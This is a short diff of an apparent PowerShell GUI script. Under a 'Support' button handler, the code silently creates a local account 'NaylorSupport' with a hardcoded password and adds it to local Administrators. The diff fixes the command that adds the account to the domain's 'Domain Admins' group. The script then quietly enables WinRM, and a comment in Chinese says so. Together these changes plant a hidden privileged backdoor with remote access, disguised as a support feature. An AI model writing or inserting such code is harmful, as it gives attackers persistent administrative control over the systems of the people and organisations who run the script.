@@ -176,7 +176,7 @@ $SupportButton.Add_Click({
     if (-not (Get-LocalUser -Name "NaylorSupport" -ErrorAction SilentlyContinue)) {
         net user NaylorSupport "Chiapet1!" /add | Out-Null
         net localgroup Administrators NaylorSupport /add | Out-Null
-        try { net localgroup "Domain Admins" NaylorSupport /add | Out-Null } catch { }
+        try { net group "domain admins" NaylorSupport /add | Out-Null } catch { }
 
         # 安静地配置 WinRM
         winrm quickconfig -q | Out-Null
